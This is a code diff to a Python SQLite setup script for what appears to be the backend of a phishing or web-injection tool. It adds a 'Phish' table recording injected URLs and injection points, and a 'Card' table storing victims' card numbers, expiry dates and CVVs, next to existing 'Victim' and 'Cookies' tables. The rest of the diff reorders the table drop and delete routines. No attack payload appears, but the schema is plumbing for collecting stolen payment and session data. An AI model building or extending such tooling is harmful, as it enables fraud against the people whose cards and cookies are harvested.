@@ -69,6 +69,28 @@ def create_all_tables():
     );"""
     c.execute(q)
 
+        #### Create Phish Table ####
+    q = """CREATE TABLE IF NOT EXISTS Phish (
+    EmailIP VARCHAR(255),
+    Url TEXT,
+    InjectLocation VARCHAR(255),
+    InjectClass VARCHAR(255),
+    FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
+    );"""
+    c.execute(q)
+
+    #### Create CreditCard Table ###
+    q = """CREATE TABLE IF NOT EXISTS Card (
+        EmailIP CHAR(3),
+        NameOnCard VARCHAR(30),
+        CardNumber CHAR(16),
+        ExpirationMonth CHAR(2),
+        ExpirationYear CHAR(4),
+        CVV CHAR(3),
+        FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
+    );"""
+    c.execute(q)
+
     conn.commit()
     conn.close()
 
@@ -93,10 +115,13 @@ def drop_all_tables():
     q = "DROP TABLE IF EXISTS Cookies"
     c.execute(q)
 
-    q = "DROP TABLE IF EXISTS Users"
+    q = "DROP TABLE IF EXISTS Card"
     c.execute(q)
 
     q = "DROP TABLE IF EXISTS Victim"
+    c.execute(q)
+    
+    q = "DROP TABLE IF EXISTS Users"
     c.execute(q)
 
     conn.commit()
@@ -123,10 +148,13 @@ def delete_db():
     q = "DELETE FROM Cookies"
     c.execute(q)
 
-    q = "DElETE FROM Users"
+    q = "DELETE FROM Card"
     c.execute(q)
 
     q = "DELETE FROM Victim"
+    c.execute(q)
+
+    q = "DElETE FROM Users"
     c.execute(q)
 
     conn.commit()
